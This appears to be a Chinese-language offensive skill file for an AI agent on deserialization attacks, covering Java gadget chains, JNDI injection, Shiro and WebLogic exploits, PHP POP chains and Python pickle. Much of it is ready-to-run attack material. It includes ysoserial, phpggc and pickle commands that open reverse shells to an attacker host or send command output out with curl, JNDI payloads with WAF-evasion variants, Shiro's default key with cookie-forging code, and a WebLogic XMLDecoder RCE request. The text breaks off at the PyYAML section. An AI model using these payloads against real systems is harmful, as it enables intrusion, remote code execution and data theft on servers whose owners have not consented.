---
name: deserialization-testing
description: 反序列化漏洞深度攻防专业技能：Java原生反序列化(JRMP/RMI/IIOP)、CommonsCollections全链与版本兼容矩阵、TemplatesImpl深度分析、JEP 290/ObjectInputFilter过滤绕过(CVE-2026-47065)、PHP POP链构造实战、Python pickle利用面(含PyYAML/ruamel/torch.load)、AI大模型框架反序列化面(LangChain CVE-2025-68664/vLLM/PyTorch/MCP)、Gadget挖掘方法论、AI辅助攻防、反序列化→RCE→内网渗透完整链、不出网利用与回显技术、多语言工具链与WAF对抗
version: 3.0.0
---

# 反序列化漏洞深度攻防技能

## 概述

反序列化漏洞（CWE-502）发生在应用程序将不受信任的数据还原为对象时：Java 的 `readObject()`、PHP 的 `unserialize()`、Python 的 `pickle.loads()`、.NET 的 `BinaryFormatter` 在"还原对象"过程中会执行类自身代码（`readObject`/魔术方法/opcode），攻击者通过构造恶意字节流串联既有类库方法调用（Gadget 链 / POP 链），最终直达 `Runtime.exec()`、`system()`、`eval()` 等危险 Sink 实现 RCE。本技能从资深攻防专家视角，系统化覆盖**攻击面识别 → Gadget 挖掘方法论 → 各语言利用链深度分析 → 过滤器绕过 → AI 框架反序列化面 → AI 辅助攻防 → 不出网利用与回显 → 内网渗透 → 修复加固**完整攻防闭环，并同步 2025-2026 年最新利用链与 CVE 情报。

### 核心概念
- **Gadget 链（Java）**：反序列化入口（`readObject`/`readResolve`）→ 串联 classpath 中既有类的方法调用 → 最终触发危险操作。攻击者不注入新代码，只是"编排"已有类
- **POP 链（PHP）**：Property-Oriented Programming，利用魔术方法（`__destruct`/`__wakeup`/`__toString` 等）串联方法调用
- **pickle 是栈式虚拟机**：Python pickle 不是数据格式而是指令序列（opcode），反序列化即执行，`__reduce__`/`find_class` 是核心利用原语
- **原生 vs 间接反序列化**：原生（Java 序列化协议/PHP serialize/pickle）与间接（JSON/YAML/XML 解析器中的类型标记机制，如 Fastjson `@type`、Jackson `@class`、SnakeYAML `!!`）
- **过滤器（JEP 290/ObjectInputFilter）**：Java 9+ 的类级黑白名单过滤，但存在多种绕过（见第七章）
- **信任边界**：任何"数据→对象"转换都应在信任边界被审视，序列化数据本身不可信

### 安全演进时间线
| 阶段 | 时间 | 标志性事件 | 攻防要点 |
|------|------|-----------|---------|
| 启蒙期 | 2011-2015 | JRE8u20/7u21 链发布；CC 链被公开 | 反序列化可 RCE 进入大众视野 |
| 爆发期 | 2015-2016 | Apache Commons Collections CVE-2015-7501；ysoserial 发布；WebLogic CVE-2015-4852；Shiro CVE-2016-4437 | 企业中间件批量沦陷，黑名单式修复出现 |
| 绕道期 | 2017-2019 | JEP 290 (Java 9)；Jackson/Fastjson AutoType 绕过；SnakeYAML/PyYAML 链 | 过滤器/黑名单被不断绕过，expectClass、JDK-only 链出现 |
| 扩展期 | 2020-2023 | Log4Shell (CVE-2021-44228)；XStream 系列；ysoserial.net 成熟 | JNDI 注入成为通用武器，JDK 8u191+ 后转向本地 Gadget |
| 工程化期 | 2023-2025 | Gadget 自动化挖掘工具链（CodeQL/Semgrep 规则、链式搜索）；AI 辅助漏洞挖掘兴起 | 静态分析 + 语义搜索取代纯手工挖链 |
| AI 框架期 | 2024-2026 | vLLM CVE-2025-32444 (CVSS 10.0)；LangChain CVE-2025-68664 (lc 键序列化注入)；PyTorch weights_only 绕过 CVE-2025-32434；MCP STDIO 设计级 RCE；JEP 290 绕过 CVE-2026-47065 | LLM 推理/向量库/MCP 成为新反序列化攻击面，提示注入成为前置攻击向量 |

## 一、反序列化攻击面全景

### 1.1 入口识别与指纹特征
| 语言 | 入口点 | 特征指纹 |
|------|--------|---------|
| Java | `ObjectInputStream.readObject()/readUnshared()`、XMLDecoder、XStream、Hessian/Kryo/FST、Jackson `enableDefaultTyping`、Fastjson `@type`、RMI(1099)/JMX(9010)/JNDI/T3(7001)/IIOP(3700)、JMXInvokerServlet | 二进制 `AC ED 00 05`；Base64 以 `rO0AB` 开头；Cookie `rememberMe=`；T3 头 `t3 12.2.1` |
| PHP | `unserialize()`、`phar://` 文件操作、Session 反序列化、`yaml_parse`、`json_decode`+`__wakeup` | `a:2:{i:0;...}` / `O:4:"User":2:{...}` 格式 |
| Python | `pickle.loads()`/`Unpickler`、`yaml.load()`/`unsafe_load()`、`ruamel.yaml`、`torch.load()`、`shelve`、`marshal.loads`、`jsonpickle.decode()`、Celery/Django session | pickle 以 `\x80\x03`/`\x80\x04`/`\x80\x05` 开头；YAML `!!python/object` 标签 |
| .NET | `BinaryFormatter.Deserialize()`、`LosFormatter`、`SoapFormatter`、`NetDataContractSerializer`、`Json.NET TypeNameHandling`、ViewState | BinaryFormatter 头 `00 01 00 00 00 FF FF`；ViewState 为 Base64（可含 `FF 01` 魔术字节） |
| Ruby | `Marshal.load()`、`YAML.load()`（Psych）、`JSON.parse(create_additions: true)` | Marshal 二进制 `\x04\x08` 开头 |
| Node.js | `node-serialize`、`serialize-to-js`、`js-yaml` unsafelyLoad、`safe-obj` 等 | 函数体序列化为 `_$$ND_FUNC$$_function(){...}()` 特征 |

### 1.2 数据传输格式分类
- **二进制原生**：Java 序列化（`rO0AB`）、.NET BinaryFormatter、Ruby Marshal、Python pickle
- **JSON**：Fastjson `@type`、Jackson `@class`/`defaultTyping`、Json.NET `$type`、jsonpickle `py/object`、node-serialize `_$$ND_FUNC$$_`
- **XML**：XStream、XMLDecoder、.NET SoapFormatter、Log4j JNDI（表达式注入）
- **YAML**：PyYAML（`!!python/object/apply`）、SnakeYAML（`!!javax.script.ScriptEngineManager`）、Ruby Psych
- **RPC/分布式**：Hessian/Burlap（Dubbo）、AMF（BlazeDS）、RMI/JRMP、T3/IIOP（WebLogic）、ZeroMQ `recv_pyobj`（vLLM）、gob（Go）
- **特殊触发面**：Phar 元数据（任意文件操作函数触发）、日志（Log4Shell `\${jndi:}`）、模板引擎（freemarker/velocity 的 `objectWrapper`）

### 1.3 常见框架/组件高危 CVE 全景（含 2025-2026 新增）
| 组件 | CVE / 编号 | Gadget / 危害 |
|------|-----------|---------------|
| Apache Commons Collections | CVE-2015-7501 | CC1-CC7 链 |
| Fastjson 1.x / 2.x | 多个 AutoType 绕过 / CVE-2026-16723 / QVD-2026-45876 | JNDI/Gadget-free RCE（详见 fastjson-exploitation 技能） |
| Jackson | CVE-2017-17485 / CVE-2019-12384 | enableDefaultTyping RCE |
| Apache Shiro ≤1.2.4 | CVE-2016-4437 | rememberMe 硬编码密钥 AES-CBC 反序列化 |
| WebLogic | CVE-2015-4852 / CVE-2017-10271 / CVE-2019-2725 / CVE-2020-2555 / CVE-2023-21839 | T3/IIOP/XMLDecoder RCE |
| JBoss/WildFly | CVE-2017-12149 / CVE-2017-7504 | 反序列化 RCE |
| Jenkins | CVE-2015-8103 / CVE-2016-0788 / **CVE-2026-53435**（JEP-200 ClassFilter 绕过，config.xml 任意类型反序列化 + Stapler 路由 → 用户冒充/Script Console Groovy RCE/任意文件读） | 反序列化 RCE |
| Apache Log4j2 | CVE-2021-44228 (Log4Shell) | JNDI 注入 RCE |
| XStream | CVE-2021-21342 等多个 | XML 反序列化 RCE |
| SnakeYAML | CVE-2022-1471 | `!!` 标签 RCE |
| **LangChain / LangGraph** | **CVE-2025-68664（CVSS 9.3，`lc` 键序列化注入→环境变量窃取/类实例化）；CVE-2025-64439（checkpoint 反序列化 RCE）；CVE-2025-67644（SQLite checkpoint SQLi）** | 提示注入→序列化注入→RCE/密钥窃取 |
| **vLLM** | **CVE-2025-32444（CVSS 10.0，mooncake 集成 ZeroMQ+pickle 未认证 RCE）；CVE-2025-24357（torch.load 恶意模型 RCE）** | pickle 反序列化 RCE |
| **PyTorch** | **CVE-2025-32434（torch.load weights_only=True 绕过）** | pickle RCE |
| **python-socketio** | **CVE-2025-61765（Redis 消息队列 pickle RCE）** | 中间件 pickle 投毒 |
| **MCP（Model Context Protocol）** | **STDIO 设计级 RCE（"The Mother of All AI Supply Chains"，12+ CVE，150M+ 下载受影响）；CVE-2026-33032（nginx-ui MCP 未认证命令执行，CVSS 9.8）** | 配置→命令执行；提示注入→工具投毒→数据外带 |
| **Java 过滤器绕过** | **CVE-2026-47065（resolveProxyClass 绕过 ObjectInputFilter，CVSS 9.8）；CVE-2026-62263（OpenAM 白名单 depth>1 短路绕过，CVSS 9.2）** | 过滤器形同虚设 |
| PHP Laravel/Symfony/ThinkPHP | CVE-2018-15133 等 | POP 链 RCE |
| RubyGems | Gem::SpecFetcher→Runtime 链（2024） | Marshal.load RCE |
| .NET ViewState / BinaryFormatter | 无 machineKey 验证 | RCE |
| 恶意 pickle 工具 | **CVE-2025-1716（PickleScan 静态分析绕过）** | 检测规避 |

## 二、Gadget 挖掘方法论

### 2.1 动态分析（黑盒/半黑盒）
```bash
# 1. 利用工具批量爆破 Gadget 存在性（GadgetProbe：通过反序列化错误信息探测 classpath 类）
java -jar GadgetProbe.jar -u http://target/endpoint -p rO0AB...(Payload) -d "X-Api: test"

# 2. 无回显场景用 DNS/延迟侧信道判断链是否生效
java -jar ysoserial.jar CommonsCollections6 'sleep 10' > probe.ser
curl -s -X POST --data-binary @probe.ser -H "Content-Type: application/x-java-serialized-object" \
  http://target/api -w "耗时:%{time_total}s"   # 若 10s+ → 链生效

# 3. 逐类注入测试（ClassPathScanner / 自写 PoC）：对候选类做"存在性+readObject 行为"探测
```

### 2.2 静态审计（白盒）
```bash
# 搜索反序列化入口（全语言通用关键字）
# Java: readObject|readUnshared|XMLDecoder|XStream|fromXML|ObjectMapper.*enableDefaultTyping|JSON.parse|HessianInput|Kryo.read
# PHP: unserialize|phar://|yaml_parse|__wakeup|__destruct
# Python: pickle.loads|cPickle|yaml.load|unsafe_load|torch.load|shelve.open|marshal.loads|jsonpickle.decode
# .NET: BinaryFormatter|LosFormatter|SoapFormatter|NetDataContractSerializer|TypeNameHandling|Deserialize
# Ruby: Marshal.load|YAML.load|Psych.load|create_additions
# Node: serialize|unserialize|node-serialize|_$$ND_FUNC$$

# 依赖版本审计（checkknown CVE）
mvn dependency:tree | grep -iE "commons-collections|fastjson|jackson|snakeyaml|xstream"
pip-audit; pipenv check; bundle-audit; composer audit; dotnet list package --vulnerable
```

### 2.3 链式搜索与自动化挖掘工具
- **CodeQL**：`java`/`python`/`csharp` 数据流查询——定义 `readObject` 为 source，`Runtime.exec`/`ProcessBuilder` 为 sink，自动发现可利用链
- **Semgrep**：轻量正则/模式匹配规则（社区有大量反序列化规则集），适合 CI 集成
- **JShell/wh1sper/Automated Gadget Chain Discovery**：自动搜索"反序列化入口→危险方法"的调用链
- **SerializationDumper**：解析 Java 序列化字节流，逆向分析协议结构、手工改包绕过
- **pickletools**（Python 标准库）：`pickletools.dis(payload)` 逐步解析 opcode，理解与修改 pickle 指令
- **chain 生成辅助**：ysoserial 源码本身就是"链模板库"；`ysoserial-modified`/`ysoserial-ng` 提供更多变体

### 2.4 挖掘流程（专家套路）
```
1. 枚举所有"网络输入→反序列化"路径（HTTP body/Cookie/Header/消息队列/RPC/文件上传）
2. 收集目标 classpath 依赖清单（报错堆栈/Jar 泄露/GadgetProbe/目录浏览/错误页面）
3. 语义检索：找出所有可被 readObject 触发的入口类（readObject/readResolve 重写类）
4. 从入口类出发做调用图分析，找可控参数是否到达危险 Sink（exec/eval/反射 newInstance/jndi lookup）
5. 对候选链用 ysoserial 框架模板化验证；逐个版本、逐个 JDK 适配
6. 优先级：无第三方依赖的 JDK-only 链 > 高频依赖链（CC/CB）> 框架特有链
```

## 三、Java 原生反序列化深度

### 3.1 原生协议结构
```
AC ED 00 05            <- magic + version
TC_OBJECT (0x73)       <- 对象标记
TC_CLASSDESC (0x72)    <- 类描述
  className / serialVersionUID / flags / fields...
TC_STRING / TC_REFERENCE ...
```
手工构造要点：`TC_REFERENCE`（引用回溯）、`TC_RESET`（重置句柄表）、`TC_PROXYCLASSDESC`（0x7D，代理类描述——**过滤器绕过关键**，见 7.3）。

### 3.2 JRMP / RMI / IIOP 攻击面
```bash
# RMI Registry 反序列化（1099 端口）：直接向 Registry 接口发送序列化对象
# 工具：ysoserial.exploit.RMIRegistryExploit
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections6 "curl http://attacker/$(whoami)"

# JRMPListener：伪装 JRMP 服务端，目标连入即反序列化（适用"目标主动回连"场景）
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -i >& /dev/tcp/attacker/4444 0>&1"

# JRMPClient：构造触发反向 JRMP 连接的对象（结合 JNDI 使用）
java -cp ysoserial.jar ysoserial.payloads.JRMPClient <attacker> 1099 > jrmp.ser

# IIOP（CORBA）：WebLogic 3700 端口，工具 weblogic_cve_2020_2555 / iiopDeserialize
# 探测：nmap -sV -p 1099,7001,3700,9010 目标
```

### 3.3 JNDI 注入（Log4Shell 类）
```
# 触发点：反序列化链/JNDI lookup/日志格式化/表达式注入中可控的 jndi 引用
${jndi:ldap://attacker.com:1389/obj}
${jndi:rmi://attacker.com:1099/obj}
${jndi:dns://attacker.com/xxx}               # DNS 外带检测
${jndi:ldap://${hostName}.attacker.com/obj}  # 外带主机名

# WAF 绕过变形
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/obj}
${${::-j}ndi:ldap://attacker.com/obj}
${${env:FOO:-j}ndi:ldap://attacker.com/obj}
%24%7Bjndi:ldap://attacker.com/obj%7D

# JDK 版本决定可利用性（关键矩阵）：
# RMI 远程 codebase:      JDK <= 8u121   （更高需 Rogue-JNDI 本地工厂绕过）
# LDAP 远程 codebase:     JDK <= 8u191
# 高版本 JDK：需本地 Gadget（如 BeanFactory）或 LDAP 返回序列化数据
# 攻击服务器：
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit" 1389
java -jar rogue-jndi.jar -n "ldap://attacker:1389" -c "calc.exe"
```

### 3.4 无依赖 JDK-only 链
| 链 | 触发类 | JDK 版本限制 |
|----|--------|-------------|
| Jdk7u21 | `AnnotationInvocationHandler` + `TemplatesImpl` + `LinkedHashSet` | 7u21-7u51 附近，8u 部分版本（8u20 前） |
| Jdk8u20 | `AnnotationInvocationHandler` + 引用复用 | JDK 8u20 及其后部分版本（被后续修复） |
| Jdk8u21 | `TemplatesImpl` 变体 | 特定 8u 版本 |
**价值**：JEP 290 过滤第三方库时，JDK-only 链往往不受影响（白名单类常被放行）。

## 四、CommonsCollections 全链与版本兼容矩阵

### 4.1 全链总表与兼容矩阵
| 链 | 入口触发 | 核心类 | commons-collections | JDK 限制 | 备注 |
|----|---------|--------|--------------------|---------|------|
| CC1 | `AnnotationInvocationHandler.readObject` → TransformedMap | `InvokerTransformer`+`ChainedTransformer` | 3.x | < 8u71（AIH 被限制） | 开山之作 |
| CC2 | `PriorityQueue.readObject` → `TransformingComparator` | `InvokerTransformer`+`TemplatesImpl` | 4.x | 无严格限制 | CC4 同源 |
| CC3 | `PriorityQueue`/`TrAXFilter` → `InstantiateTransformer` | `TrAXFilter`+`TemplatesImpl` | 3.x/4.x | 无严格限制 | 抛掉 AIH 依赖 |
| CC4 | `PriorityQueue` → `TransformingComparator` | `InstantiateTransformer`+`TemplatesImpl` | 4.x | 无严格限制 | |
| CC5 | `BadAttributeValueExpException.readObject` → `TiedMapEntry` | `ChainedTransformer`+`LazyMap` | 3.x | < 8u71 | |
| CC6 | `HashSet.readObject` → `TiedMapEntry.hashCode` | `LazyMap`+`TiedMapEntry`+`InvokerTransformer` | 3.x/4.x 通用 | JDK 7/8 全版本 | **最通用，首选** |
| CC7 | `Hashtable.readObject` → `LazyMap` | `LazyMap`+`AbstractMapDecorator` | 3.x | 8u71+ 可用 | 后 8u71 时代主力 |
| CC-TransformedMap 变体 | `TransformedMap.checkSetValue` | 同上 | 3.x | | 老变体 |
| CC-LazyMap 变体 | `LazyMap.get` | 同上 | 3.x/4.x | | 家族最多变体 |

### 4.2 选链原则
- **盲打首选 CC6**：对 commons-collections 3.x/4.x 双兼容、JDK 7/8 全版本，兼容性最好
- **高版本 JDK（8u71+）**：CC1/CC5 失效（`AnnotationInvocationHandler` 反序列化受限），用 CC6/CC7
- **4.x 环境**：CC2/CC4；**3.x 环境**：CC1/CC5/CC7
- **TemplatesImpl 终点变体**：CC2/CC3/CC4 的终点都是 `TemplatesImpl.newTransformer()`（详见第五章）

### 4.3 生成与投递
```bash
# 生成（命令注意跨平台：Linux 用 bash -c，Windows 用 cmd /c）
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' > cc6.ser
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' > cc1.ser
java -jar ysoserial.jar CommonsBeanutils1 'curl http://attacker.com/$(id|base64)' > cb1.ser
java -jar ysoserial.jar URLDNS 'http://xxx.dnslog.cn' > urldns.ser   # 无 RCE 探测

# Base64 投递（HTTP 参数）
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
# 原始二进制投递
cat cc6.ser | curl -s -X POST -H 'Content-Type: application/x-java-serialized-object' --data-binary @- http://target/api
```

## 五、TemplatesImpl 与其他核心 Gadget 深度

### 5.1 TemplatesImpl 原理
`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 是大量链的"终点执行器"：
```
TemplatesImpl.newTransformer() → getTransletInstance() → defineTransletClasses()
→ ClassLoader.defineClass(_bytecodes[i]) 加载攻击者字节码 → 实例化触发 <clinit>/构造器 → RCE
```
关键可控字段（均需反射写入）：
- `_bytecodes`：恶意类字节码数组（Java 字节码，可经 ASM/javac 生成）
- `_name`：非空即可（如 `"a.b"`）
- `_tfactory`：`TransformerFactoryImpl` 实例（序列化时需 `_tfactory` 非空）
- `_outputProperties`/`_version`：触发 `newTransformer()` 的入口

### 5.2 手动构造 TemplatesImpl 变体
```java
// 恶意类（继承 AbstractTranslet，静态块/构造器执行命令）
public class Evil extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
    static { try { Runtime.getRuntime().exec("id"); } catch (Exception e) {} }
    public void transform(...) {} public void transform(...) {}
}
```
```java
// 反射构造 TemplatesImpl 并序列化（ysoserial 内部即此逻辑）
TemplatesImpl templates = new TemplatesImpl();
Field f = TemplatesImpl.class.getDeclaredField("_bytecodes");
f.setAccessible(true);
f.set(templates, new byte[][]{evilClassBytes});
// 依次设置 _name、_tfactory，序列化输出
```
**变体**：
- **BCEL 变体**（`com.sun.org.apache.bcel.internal.util.ClassLoader`）：JDK < 8u251 可用，`$$BCEL$$` 编码字节码，配合 `BasicDataSource`/`UnpooledDataSource` 做**不出网利用**
- **JNDI 变体**：`TemplatesImpl` 内部执行 JNDI lookup（如配合 `JdbcRowSetImpl` 终点）
- **回显变体**：恶意类内嵌内存马/命令回显逻辑（见第十四章）

### 5.3 其他高频 Gadget 库速查
```
- CommonsBeanutils (CB1/CB1.92)：BeanComparator + TemplatesImpl，仅需 commons-beanutils（Shiro 常用）
- Spring1/Spring2：MethodInvokeTypeProvider / JdkDynamicAopProxy（Spring-core 环境）
- Groovy1：MethodClosure（groovy 环境）
- ROME：ObjectBean + TemplatesImpl（rome 依赖）
- Hibernate1/2：Getter/Collection（hibernate 环境）
- Jython1 / Mozilla Rhino1 / BeanShell1：脚本引擎类（对应脚本库环境）
- C3P0：WrapperConnectionPoolDataSource 二次反序列化（HexAsciiSerializedMap:）
- URLDNS：仅触发 DNS 解析，无 RCE，用于漏洞探测
- AspectJWeaver：写文件链（aspectjweaver 依赖）
- Clojure：clojure.lang 反射链
```

## 六、Java 主流中间件反序列化链

### 6.1 Shiro RememberMe（CVE-2016-4437）
```
特征：Cookie rememberMe=xxx，AES-128-CBC 加密，默认密钥硬编码
默认密钥：kPH+bIxk5D2deZiIxcaaaA==
检测：发送 rememberMe=1，响应出现 rememberMe=deleteMe
利用步骤：
1. 爆破密钥（ShiroExploit/ShiroAttack2 遍历 100+ 已知密钥）
2. 选定 Gadget（CB1 最稳，仅需 beanutils；其次 CC2-CC7/Groovy1/Spring1）
3. AES-CBC 加密序列化数据 → 写入 rememberMe Cookie
```
```python
# 构造 Shiro Cookie（Python 示例）
import base64, os
from Crypto.Cipher import AES
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
payload = open("cb1.ser", "rb").read()
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
iv = os.urandom(16)
cookie = base64.b64encode(iv + AES.new(key, AES.MODE_CBC, iv).encrypt(payload)).decode()
# Cookie: rememberMe=<cookie>
```

### 6.2 WebLogic T3/IIOP/XMLDecoder
```bash
# T3 协议（7001）：T3 握手后发送序列化数据（工具：weblogicScan / ysoserial 改造 / CVE-2015-4852 复现脚本）
# IIOP（3700）：CVE-2020-2555（Coherence 链）等
# XMLDecoder RCE（CVE-2017-10271 / CVE-2019-2725）：
```
```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></void>
</java>
</work:WorkContext></soapenv:Header><soapenv:Body/>
</soapenv:Envelope>
```

### 6.3 JBoss / Jenkins / 其他
```
# JBoss：/invoker/JMXInvokerServlet、/invoker/EJBInvokerServlet（CVE-2017-12149 等），POST 序列化数据
# Jenkins：/cli 接口 / POST config.xml（CVE-2026-53435：JEP-200 ClassFilter 放行核心/插件类，readResolve gadget + Stapler 反射路由 → 冒充用户/Script Console Groovy RCE/任意文件读）
# Fastjson/Jackson/Fastjson2：JSON 类反序列化，详见 fastjson-exploitation 技能（@type 绕过、Gadget-free、FNV-1a 碰撞）
# Hessian/Dubbo：RPC 反序列化，ysoserial-modified 提供 hessian 适配链
```

### 6.4 WAF 绕过（Java 反序列化流量层）
```
# 1. 分块传输（chunked），避免 WAF 完整组装
# 2. Content-Type 变换：application/octet-stream、;charset=utf-8、multipart/form-data 字段包裹
# 3. Gzip/Deflate 压缩（Content-Encoding: gzip）
# 4. 序列化数据混淆：插入垃圾数据、TC_RESET/TC_REFERENCE 嵌套、增加对象图深度
# 5. HTTP 参数污染（双 data 参数）、POST→GET 转换、Header 注入（X-Forwarded-For/Cookie/X-Token 携带 payload）
# 6. 编码变形：Base64 URL 编码、Hex URL 编码、Unicode 编码类名字段
```

## 七、原生反序列化过滤与绕过

### 7.1 防御机制全景
- **JEP 290 / ObjectInputFilter**（Java 9+）：JVM 级反序列化类过滤，模式语法支持黑白名单、深度/字节数/引用数限制
```java
// 示例：拒绝 commons-collections 所有类 + 限制深度
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "!org.apache.commons.collections.*;maxdepth=30;maxbytes=1048576;maxrefs=1000");
ObjectInputFilter.Config.setSerialFilter(filter);
```
- **Look-ahead 反序列化**：SerialKiller / NotSoSerial / Contrast 等，反序列化前预检类
- **resolveClass 重写白名单**：继承 `ObjectInputStream` 重写 `resolveClass` 白名单放行
- **框架级 ClassFilter**：Jenkins JEP-200、WebLogic 黑名单、Shiro 密钥隔离

### 7.2 黑名单绕过思路
1. **等价类替换**：黑名单封 `Transformer` → 换 CB1/ROME/Spring/Hibernate/JDK-only 链
2. **JDK-only 链**：Jdk7u21/Jdk8u20 只用 JDK 类，黑名单一般不会封
3. **不常见包路径**：`com.sun.*`/`sun.*`/`java.*` 内部类常被忽略（如 `sun.reflect.annotation.AnnotationInvocationHandler`、`com.sun.org.apache.xalan...TemplatesImpl`）
4. **替代格式侧迁**：原生被过滤 → 转 XML（XStream）/YAML（SnakeYAML）/JSON（Fastjson）等间接反序列化入口

### 7.3 白名单 / JEP 290 过滤器绕过（2025-2026 最新）
1. **resolveProxyClass 绕过（CVE-2026-47065，CVSS 9.8）**：过滤器不拦截 `TC_PROXYCLASSDESC`（0x7D）代理类描述符的 `resolveProxyClass()` 分派。构造以 `java.lang.reflect.Proxy` 为根的流，接口指向可调用接口 + 内嵌恶意 `InvocationHandler`（如 `AnnotationInvocationHandler`），**绕过 acceptMatchers 白名单**直达 RCE
2. **白名单 depth>1 短路绕过（CVE-2026-62263，OpenAM，CVSS 9.2）**：过滤器若对 `depth > 1` 的对象直接 `ALLOWED`，则白名单只约束根类，嵌套图完全不受检——构造根为被放行类（如 `AuthenticatorImpl`）、内部嵌套完整 Gadget 链即可（readObject 在 cast/断言之前执行）
3. **框架自成员 gadget（CVE-2026-53435，Jenkins）**：过滤器只查类"来自哪里"（core/plugin 命名空间），不查类"做什么"。利用框架自身 `readResolve` 有副作用的类作为 gadget
4. **未覆盖入口**：过滤器只设置在 `ObjectInputStream` 主路径，RMI/JMX/IIOP/Hessian 等其他反序列化入口未设置
5. **Look-ahead 工具只检首类**：SerialKiller/NotSoSerial 若只检查根类，用合法根类包裹深层恶意图绕过
6. **字节流畸形**：修改 serialVersionUID 逃逸校验、垃圾字节填充、利用 `TC_RESET` 重置句柄表规避指纹规则

### 7.4 JDK 版本限制绕过
- JDK 8u191+ 远程 codebase 默认禁用 → 用本地 Gadget 链（CC/CB 等）替代 JNDI 远程类加载
- JDK 8u71+ `AnnotationInvocationHandler` 反序列化受限 → CC1/CC5 失效，改用 CC6/CC7
- JDK 8u251+ BCEL `ClassLoader` 被移除 → BCEL 链失效，改用 TemplatesImpl/文件写入
- JDK 9+ 模块化：`com.sun.*` 默认不可反射 → 需 `--add-exports` 或找未封装类

## 八、PHP 反序列化 POP 链构造实战

### 8.1 魔术方法与序列化格式
```php
__construct() / __destruct()  // 创建/销毁时
__wakeup()                   // unserialize() 时（CVE-2016-7124 可绕过）
__toString()                 // 对象被当字符串时（最常用链点）
__get($n) / __set($n,$v)     // 访问/设置不存在属性
__isset() / __unset()        // isset/empty/unset 不存在属性
__invoke()                   // 对象被当函数调用
__call($m,$a) / __callStatic()  // 调用不存在方法
__sleep()                    // serialize() 前
// 格式：O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:20;}
// __wakeup 绕过：属性计数大于实际个数则不执行 __wakeup
O:4:"Test":2:{s:3:"cmd";s:2:"id";}   // 2 > 1 → 跳过 __wakeup（PHP<7.4 有效）
```

### 8.2 POP 链构造方法论（实战步骤）
```
1. 定位入口：审计 unserialize() 调用点；识别可传入对象图的参数（Cookie/Session/DB 字段/JSON）
2. 收集链点类：grep 所有定义了 __destruct/__wakeup/__toString/__call 的类
3. 追踪调用：从链点方法体出发，人工/工具追踪其调用的其他方法/属性（xdebug 断点 + var_dump 辅助）
4. 找危险 Sink：system/exec/shell_exec/eval/assert/preg_replace(/e)/file_put_contents/include/require/unserialize(嵌套)
5. 拼装：自底向上构造对象图——先实例化 Sink 侧对象，再用链点类包装，最后序列化
6. 验证：本地搭同名依赖环境（composer 同版本），直接 unserialize 验证 POP 链有效性
```
```php
// 典型 POP 链骨架（思想示例：A.__destruct → B.__toString → system）
class A { public $b; public function __destruct() { echo $this->b; } }        // 链点1：当字符串
class B { public $cmd; public function __toString() { system($this->cmd); } } // 链点2：Sink
$payload = serialize(new A());   // 需手工填充 $b = new B()
```

### 8.3 phpggc（PHP Generic Gadget Chains）
```bash
./phpggc -l                              # 列出全部链
./phpggc Laravel/RCE1 system id           # 框架链
./phpggc Monolog/RCE1 system id
./phpggc Symfony/RCE4 system id
./phpggc ThinkPHP/RCE1 system id
./phpggc -p phar Laravel/RCE1 system id > payload.phar   # Phar 格式
./phpggc -w phar://xxx Monolog/RCE1 system id            # wrapper 封装
./phpggc Laravel/RCE1 system 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' | base64 -w0
```

### 8.4 Phar 反序列化（无需 unserialize() 的入口）
```php
// 原理：phar 元数据在任意文件操作函数中自动反序列化
// 触发点：file_exists/fopen/file_get_contents/is_dir/include/stat 等 + phar:// 伪协议
file_exists('phar://upload/avatar.phar/test.txt');
// 生成：phpggc -p phar ... ；绕过上传：文件头加 GIF89a 签名
// PHP 8.0+ 部分环境中 phar 元数据处理策略变化，但 phar:// 触发面仍广泛存在
```

### 8.5 Session 反序列化与引擎不一致
```php
// php / php_serialize / php_binary 三种引擎存储格式不同
// 若 session.serialize_handler 与存储时不一致，可注入对象：
// php 引擎存储 "key|value"，php_serialize 引擎读取时把 | 后内容按 serialize 解析 → 构造 |O:4:"Test":1:{...}
```

## 九、Python pickle 利用面

### 9.1 pickle 栈式虚拟机核心
```python
import pickle, pickletools
# opcode 速查：c=global(import) o=build R=reduce S=string t=tuple g=GET b=BINPUT .=stop
# 经典 payload：cos\nsystem\n(S'id'\ntR.
# 等价 Python 对象：pickle.dumps 后 pickletools.dis 可逐步解析指令
class Pwn:
    def __reduce__(self):   # __reduce__ 返回 (callable, args)，反序列化时执行 callable(*args)
        import os
        return (os.system, ('id',))
payload = pickle.dumps(Pwn())
# 反弹 shell / 一键生成：
cmd = "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"
print(pickle.dumps(Pwn()).hex())   # 或 base64.b64encode(pickle.dumps(...))
```

### 9.2 find_class 限制绕过
```python
# 防御方常继承 Unpickler 重写 find_class 做白名单 —— 绕过思路：
# 1. 白名单放行子模块但漏掉其危险成员（如允许 os 却放行 os.system / subprocess）
# 2. 利用非直接 import 的等价可达类：如 builtins.getattr、operator.attrgetter 组合
# 3. 序列化利用"已缓存/间接可达"的类（memo 复用）
# 4. 框架自带危险"加载器"类（如 torch._utils._rebuild_tensor_v2 曾可被滥用）
```

### 9.3 PyYAML / ruamel 变体
```yaml
